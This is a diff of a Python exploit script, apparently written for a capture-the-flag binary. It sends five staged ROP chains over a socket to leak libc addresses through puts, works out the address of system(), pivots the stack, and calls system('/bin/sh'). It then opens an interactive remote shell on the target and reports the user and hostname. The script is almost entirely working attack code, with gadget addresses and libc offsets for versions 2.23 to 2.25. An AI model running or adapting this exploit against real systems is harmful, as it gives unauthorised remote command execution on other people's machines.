@@ -4,36 +4,24 @@ import struct
 from time import sleep
 import sys
 from subprocess import *
-from fcntl import fcntl, F_GETFL, F_SETFL
-from os import O_NONBLOCK, read
-import signal
 import socket
 
 hostname = sys.argv[1]
 port = int(sys.argv[2])
 libc = sys.argv[3]
 
+#libc offsets
 if libc == "2.25":
 	libc_system_distance = 0x40d60
-	__libc_start_dist	 = 0x20470 
+	libc_start_offset	 = 0x20470 
 
 if libc == "2.24":
 	libc_system_distance = 0x3f480
-	__libc_start_dist	 = 0x201f0 
-	
+	libc_start_offset	 = 0x201f0 
+
 if libc == "2.23":
 	libc_system_distance = 0x45390
-	__libc_start_dist	 = 0x20740 
-
-__libc_start_ptr     = 0x601020
-
-puts 				 = 0x40063a
-def enable_sigpipe():
-
-    signals = ('SIGPIPE', 'SIGXFZ', 'SIGXFSZ')
-    for sig in signals:
-        if hasattr(signal, sig):
-            signal.signal(getattr(signal, sig), signal.SIG_DFL)
+	libc_start_offset	 = 0x20740 
 
 def str_to_lendian(shellcode_str):
 	shellcode_str = shellcode_str[::-1]
@@ -48,7 +36,6 @@ def build_bytes(rop_obj):
 		return ''.join(shellcode_list)
 
 	elif type(rop_obj) is str:
-		#shellcode_str = str_to_lendian(rop_obj)
 		return str_to_lendian(rop_obj)
 
 def read_netbytes(recv_output, outputtype):	
@@ -62,71 +49,69 @@ def read_netbytes(recv_output, outputtype):
 	if outputtype == "bytes":
 		return [i for i in response_list if i != '0xa']
 
-def shell():
-	while True:
-		sleep(.1)
-		output = s.recv(2048)
-		print output
-		shell_command = raw_input("# ")
-		s.sendall(shell_command+"\n")	
-		if shell_command.lower() == "quit" or shell_command.lower() == "exit":
-			s.close()
-			break
-		sleep(.5)
+__libc_start_ptr     = 0x601020
+puts 				 = 0x40063a # address to puts() function
+pop_rdi				 = 0x4006d3 # pop rdi; ret
+pop_rbp				 = 0x400590 # pop rbp; ret
+stdin  				 = 0x40064e # jump to instruction where stdin is loaded
+flush				 = 0x40063f # flush() function, writes to stdout
+turtleshell = build_bytes("/bin/sh\x00")
+banner = "ROP me outside, how 'about dah?\n"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 s.connect((hostname, port))
 
-banner = "ROP me outside, how 'about dah?\n"
+#padding prior to base pointer (rbp) overwrite
+padding = []
+padding.append(0x4141414141414141) #
+padding.append(0x4242424242424242) #
+padding.append(0x4343434343434343) #
+padding.append(0x4444444444444444) #
+padding.append(0x4545454545454545) #
+padding.append(0x4646464646464646) #
+padding.append(0x4747474747474747) #
+padding.append(0x4848484848484848) #
+
+############## ROP CHAIN 1 ##############
+
 response1 = s.recv(len(banner))
 sleep(1)
 if response1 == banner:
 	print "[+] Received banner."
 
-
 raw_input("[+] Press enter to continue: ")
 
-turtleshell = build_bytes(" sh    #")
-
-roplist1 = []
-roplist1.append(0x4141414141414141) #<--- rid ptr on first loop
-roplist1.append(0x4242424242424242) #
-roplist1.append(0x4343434343434343) #
-roplist1.append(0x4444444444444444) #
-roplist1.append(0x4545454545454545) #
-roplist1.append(0x4646464646464646) #
-roplist1.append(0x4747474747474747) #
-roplist1.append(0x4848484848484848) #
-roplist1.append(0x601174) # ret <--- rbp on first loop / pushed as rtn ptr
-roplist1.append(0x000000000040062e) #
-roplist1.append(turtleshell		  ) # <--
-roplist1.append(turtleshell		  ) #    |
-roplist1.append(turtleshell		  ) #    |
-roplist1.append(turtleshell		  ) #	 |
-roplist1.append(turtleshell		  ) #	 |
-roplist1.append(turtleshell		  ) #	 |
-roplist1.append(turtleshell		  ) #	 |
-roplist1.append(turtleshell		  ) #  	 |--- clears stack of 0xa which will
-roplist1.append(turtleshell		  ) # 	 |	  prevent subsequent ROP instructions
-roplist1.append(turtleshell		  ) #	 |	  from fgets() calls
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(turtleshell		  ) #
-roplist1.append(0xdeadbeef) #
-roplist1.append(0xdeafbabe) #
-roplist1.append(0x4141414141414141) #
+roplist1 = padding[:]
+roplist1.append(0x601250) # ret <--- rbp on first loop / pushed as rtn ptr
+roplist1.append(0x000000000040062e) # mov DWORD PTR [rbp-0x44],edi
+roplist1.append(0x0000000000400626) # <--
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #	 |
+roplist1.append(0x0000000000000000) #	 |
+roplist1.append(0x0000000000000000) #	 |
+roplist1.append(0x0000000000000000) #	 |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |	  
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |	  
+roplist1.append(0x0000000000000000) #    |--- clears stack of terminating bytes
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #    |
+roplist1.append(0x0000000000000000) #	 |
+roplist1.append(0x0000000000000000) # <--
 
 ropchain1 = build_bytes(roplist1)
 
@@ -138,177 +123,115 @@ response1 = s.recv(1024)
 if response1 == banner:
 	print "[+] Received banner."
 
+############## ROP CHAIN 2 ##############
 
-
-#Build of second stage ROP chain
-roplist2 = []
-roplist2.append(0x0000000000000000) #
-roplist2.append(0x0000000000000000) #
-roplist2.append(0x0000000000000000) #
-roplist2.append(0x0000000000000000) #
-roplist2.append(0x0000000000000000) #
-roplist2.append(0x0000000000000000) #
-roplist2.append(0x0000000000000000) #
-roplist2.append(0x0000000000000000) #
-roplist2.append(0x601250)    		#
-roplist2.append(0x00000000004006d3) # pop rdi; ret 
-roplist2.append(0x601185)           # sets RDX to 601134
-roplist2.append(0x000000000040063a) # <---- loop to puts
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
-roplist2.append(0x4141414141414141) #
+roplist2 = padding[:]
+roplist2.append(0x601350)    		# <-- set the base pointer to the bss section
+roplist2.append(pop_rdi) 			# <-- pop libc_start into rdi for us to read 
+roplist2.append(__libc_start_ptr)   # 	  this will allow us to calculate libc base address 		      
+roplist2.append(puts) 				# <---- loop to puts
 
 print "[*] Sending ze stage 2 ROP gadgets..."
 sleep(.5)
 ropchain2 = build_bytes(roplist2)
 s.sendall(ropchain2+"\n")
 response2 = s.recv(1024)
-	
-if len(response2) > 0:
-	response2 = response2[0:5]
-	stack_leak = read_netbytes(response2, "memaddr")
-	stack_leak = hex(stack_leak) + "00"
-	stack_leak = int(stack_leak,16)
-	#should return the bottom of the stack
-	print "[+] Memory stack leak at %x" % stack_leak
-
-
-
-#Build 3rd stage ROP chain
-stack_leak = stack_leak - 0x100
-
-binsh = build_bytes("sh     #")
-
-roplist3 = []
-roplist3.append(0x0000000000000000) # <---- 
-roplist3.append(0x0000000000000000) #
-roplist3.append(0x0000000000000000) #
-roplist3.append(0x0000000000000000) #
-roplist3.append(0x0000000000000000) #
-roplist3.append(0x0000000000000000) #
-roplist3.append(0x0000000000000000) #
-roplist3.append(0x0000000000000000) #
-roplist3.append(0x60115a)		    # 
-roplist3.append(0x00000000004006d3) # pop rdi
-roplist3.append(__libc_start_ptr)   # 
-roplist3.append(0x000000000040063a) # <---- loop to puts
-
-
-print "[*] Sending ze stage 3 ROP gadgets to get libc start pointer..."
-sleep(.5)
-raw_input("[+] Press enter to continue: ")
-
-ropchain3 = build_bytes(roplist3)
-
-print "[+] Sending third stage."
-s.sendall(ropchain3+"\n")
-sleep(.5)
-response3 = s.recv(1024)
-response3 = response3[0:7]
-
-libc_start_main_leak = read_netbytes(response3, "memaddr") 
-
-print "[+] Libc start main leak at %s" % hex(libc_start_main_leak)
-
+libc_start_main_leak = read_netbytes(response2, "memaddr")
+print "[+] Libc Base Address at 0x%x" % libc_start_main_leak
 print "[*] Doin' math 'n' shit..."
 
-libc_base = libc_start_main_leak - __libc_start_dist
+libc_base = libc_start_main_leak - libc_start_offset #get libc base
 print "\t[+] Libc base at addr: %s" % hex(libc_base)
 
 system = libc_base + libc_system_distance
 print "\t[+] System syscall gadget at addr: %s" % hex(system)
 
+raw_input("[+] Press enter to continue: ")
 
-#Build 3rd stage ROP chain
+############## ROP CHAIN 3 ##############
 
+roplist3 = padding[:]
+roplist3.append(0x6011f0)    		# <-- bss address that contain a pointer to the stack
+roplist3.append(pop_rdi) 			# <-- return to pop rdi gadget, next address into rdi
+roplist3.append(0x6011f0) 			# <-- stack pointer that goes into rdi register
+roplist3.append(puts) 				# <-- loop to puts() which will print out the stack
+roplist3.append(0x4141414141414141) #	  pointer we need to pivot back to stack before 
+roplist3.append(0x4141414141414141) #	  calling system
+roplist3.append(0x4141414141414141) #
+roplist3.append(0x4141414141414141) #
+roplist3.append(0x4141414141414141) #
+roplist3.append(turtleshell) 		# <--- write '/bin/sh string' to bss to reference later
+									# 	   Writing the string to stack will fail.
+print "[*] Sending stage 3 to get stack leak...."
+ropchain3 = build_bytes(roplist3)
+s.sendall(ropchain3+"\n")
+sleep(.5)
 
-roplist4 = []
-roplist4.append(binsh) # <---- 
-roplist4.append(0x0000000000000000) #
-roplist4.append(0x0000000000000000) #
-roplist4.append(0x0000000000000000) #
-roplist4.append(0x0000000000000000) #
-roplist4.append(0x0000000000000000) #
-roplist4.append(0x0000000000000000) #
-roplist4.append(0x0000000000000000) #
-roplist4.append(0x60115a) #
-roplist4.append(0x000000000040064e) # mov rdx, stin ; lea rax,[rbp-0x40]
-roplist4.append(0x60111a)		    # 
-roplist4.append(0x000000000040064e) # mov rdx, stin ; lea rax,[rbp-0x40] ; mov esi,0x1f4 ; mov rdi,rax; call fgets
-roplist4.append(stack_leak - 0x40 ) # ret to "pop rdi" instruction on stack on stack
-roplist4.append(0x000000000040064e) #
-roplist4.append(0x000000000040064e) #
+response3 =  s.recv(1024) # puts() runs with rdi set to bss address that
+								   # contains the pointer back to stack
+								   # Can't call system with the bss address range set
+								   # as the stack so we need to pivot back
+
+stack_pointer_leak = read_netbytes(response3, "memaddr")
+print "[+] Got stack stack pointer at %s" % hex(stack_pointer_leak)
+sleep(.5)
+
+stack_pointer = stack_pointer_leak - 0x1f0 #since the leaked address is at the top of the stack
+										   #we subtract 496 bytes to get back into an acceptable
+										   #range so system call doesn't crash
+
+print "[*] Pivoting back to stack at %s..." % hex(stack_pointer)
+sleep(.5)
+
+############## ROP CHAIN 4 ##############
+
+roplist4 = padding[:]
+roplist4.append(0x0000000000000000)	# <-- rbp doesn't need to be set since leave instruction will dereference
+roplist4.append(pop_rbp) 			# <-- after exiting puts(), pop our stack pointer in rbp 
+roplist4.append(stack_pointer)		# 	  on next run, leave; ret will dereference and return us to stack
+roplist4.append(stdin) 				# <-- loop back to stdin to take in our last rop chain
+
 ropchain4 = build_bytes(roplist4)
-
-
-print "[+] Sent stage 4 ROP gadgets."
 s.sendall(ropchain4+"\n")
 sleep(.5)
 
-raw_input("[+] Press enter to continue: ")
+############## ROP CHAIN 5 ##############
 
-roplist5 = []
-roplist5.append(0x4141414141414141) #
+roplist5 = padding[:]
+roplist5.append(stack_pointer)    	# <-- maintain rbp address with our leaked stack pointer
+roplist5.append(pop_rdi) 			# <-- pop the next address that holds our '/bin/sh' string
+roplist5.append(0x601398) 			# <-- address in bss that holds '/bin/sh' (turtleshell variable)
+roplist5.append(system) 			# <-- pop that shell
+roplist5.append(flush) 				# <-- flush stdout for good measure
 
+print "[*] Dumping shellcode..."
 
-#roplist4.append(0x000000000040064e) #
 ropchain5 = build_bytes(roplist5)
-
-
-print "[+] Sending 5th stage."
-raw_input("[+] Press enter to continue: ")
 s.sendall(ropchain5+"\n")
 sleep(.5)
 
-roplist5 = []
-roplist5.append(0x0000000000000000) #
-roplist5.append(0x0000000000000000) #
-roplist5.append(0x0000000000000000) #
-roplist5.append(0x0000000000000000) #
-roplist5.append(0x0000000000000000) #
-roplist5.append(0x0000000000000000) #
-roplist5.append(0x0000000000000000) # pop rbp ; ret <----ret pointer
-roplist5.append(0x00000000004006d3) # 0x40 (pop rdi; ret )
-roplist5.append(stack_leak + 0x50 ) # 0x38
-roplist5.append(0x0000000000400590) # 0x28 (pop rbp ; ret )
-roplist5.append(stack_leak)			# 0x20
-roplist5.append(system)				# 0x18 
+############## RUN SHELL ##############
 
-#roplist4.append(0x000000000040064e) #
-ropchain5 = build_bytes(roplist5)
-
-
-raw_input("[+] Press enter to continue: ")
-
-s.sendall(ropchain5+"\n")
+s.sendall("whoami\n")
 sleep(.5)
+username = s.recv(1028)
+s.sendall("hostname\n")
+sleep(.5)
+targethost = s.recv(1028)
 
-while True:
+if not username and targethost:
+	print "[-] Failed to pwn ze box :("
+	exit()
 
-	shell_command = raw_input("# ")
+else:
+	print "[+] Gyot'im! Running as %s on host %s" % (username.rstrip() , targethost.rstrip())
 
-
-	s.sendall(shell_command+"\n")	
-	sleep(.1)
-	output = s.recv(2048)
-	print output
-	if shell_command.lower() == "quit" or shell_command.lower() == "exit":
-		s.close()
-		break
-	sleep(.1)
-
-
-
+	while True:
+		shell_command = raw_input("# ")
+		s.sendall(shell_command+"\n")	
+		if shell_command.lower() == "quit" or shell_command.lower() == "exit":
+			s.close()
+			break
+		output = s.recv(2048)
+		print output
+		sleep(.1)
